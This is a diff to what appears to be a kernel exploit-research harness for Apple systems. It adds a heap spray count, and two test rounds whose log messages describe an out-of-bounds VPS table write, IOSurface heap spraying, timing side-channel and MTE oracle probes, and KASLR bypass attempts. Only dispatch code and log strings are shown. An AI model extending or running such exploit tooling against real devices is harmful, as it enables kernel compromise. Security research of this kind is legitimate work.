@@ -25945,6 +25945,9 @@ static void *worker_thread(void *arg) {
             }
 
     } else if (strcmp(mode, "table2_heap") == 0) {
+        #ifndef SPRAY_COUNT
+        #define SPRAY_COUNT 64
+        #endif
         rlog("TABLE2_HEAP: Second VPS table OOB + IOSurface spray test\n");
         rlog("Both VPS tables overflow simultaneously during MV-HEVC encoding.\n");
         rlog("NOTE: Buffer is 0x9B10 bytes in 0xC000 kalloc.49152 allocation.\n");
@@ -43534,6 +43537,20 @@ new_modes:
             IOObjectRelease(r251_svc);
             r251_done:
             rlog("*** r=251 complete ***\n");
+            goto done;
+        }
+        if (rounds == 334) {
+            rlog("*** rounds=334: Timing Side-Channel + MTE Oracle ***\n");
+            rlog("  r333: kobject=0, host_info clean, Trigon overflow patched.\n");
+            rlog("  Probe: memory entry timing, vm_copy oracle, IOSurface timing, shared cache.\n\n");
+            r331_timing_probe();
+            goto done;
+        }
+        if (rounds == 333) {
+            rlog("*** rounds=333: Trigon-Inspired KASLR Bypass Vectors ***\n");
+            rlog("  r332: XPC, entitlements, IOKit notifs.\n");
+            rlog("  Probe: host_info uninit, mach_port_kobject, PurpleGfxMem, memory entries.\n\n");
+            r330_trigon_probe();
             goto done;
         }
         if (rounds == 332) {
